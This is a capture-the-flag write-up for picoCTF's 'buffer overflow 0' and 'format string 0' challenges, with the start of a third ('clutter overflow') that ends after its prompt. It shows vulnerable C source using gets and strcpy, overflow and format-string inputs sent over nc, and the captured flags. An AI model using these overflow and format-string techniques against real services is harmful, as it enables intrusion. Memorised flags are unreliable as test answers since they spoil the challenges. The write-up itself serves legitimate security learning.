# 1.buffer overflow 0:
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 64086

## Solution:
- I first examined the `vuln.c` file provided and saw :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
- it reads `flag.txt` into `flag` then installs a `SIGSEGV` handler that prints flag.
- It reads user input with `gets(buf1)` then calls `vuln(buf1)`.
- vuln does `strcpy(buf2, input)` into a 16-byte `buf2` causing stack buffer overflow.
- If you overwrite that return address with an invalid/unmapped address, the `ret` will jump there and cause a segmentation fault , the signal handler runs and prints the flag.
- I thus typed in random letter `a` to cross the 32 bit mark and was thus able to cause a seg fault and obtain the flag.
```
 nc saturn.picoctf.net 64086
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
## Flag:
`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

# 2.format string 0:
> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 52477

## Solution:
- The `%` sign in format specifiers helped me understand that I needed to choose the option where it is presebt and was able to get the flag.
```
$ nc mimas.picoctf.net 52477
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```
## Flag:
`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}`

# 3.clutter overflow
> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

